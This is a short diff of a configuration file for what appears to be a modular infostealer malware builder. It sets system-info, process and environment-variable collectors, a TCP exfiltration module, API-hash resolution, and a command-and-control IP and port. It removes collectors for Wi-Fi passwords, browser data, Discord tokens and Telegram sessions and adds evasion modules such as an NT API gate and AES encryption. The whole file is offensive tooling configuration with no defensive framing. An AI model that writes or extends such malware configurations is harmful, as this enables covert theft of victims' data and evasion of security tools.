@@ -7,18 +7,14 @@ core:
 collectors:
 - collectors/system_info
 - collectors/processes
-- collectors/installed_software
 - collectors/env_vars
-- collectors/clipboard
-- collectors/wifi_passwords
-- collectors/browser_chromium
-- collectors/discord_tokens
-- collectors/telegram_session
-exfil: exfil/tcp_direct
+exfil: exfil/tcp_direct_v2
 arch: arch/sequential
 resources: true
 api_resolve: api_resolve/api_hash_fnv1a
-evasion: []
+evasion:
+- evasion/nttapi_gate
+- evasion/aes_encrypt
 vars:
   C2_IP: 10.0.2.2
   C2_PORT: '9001'
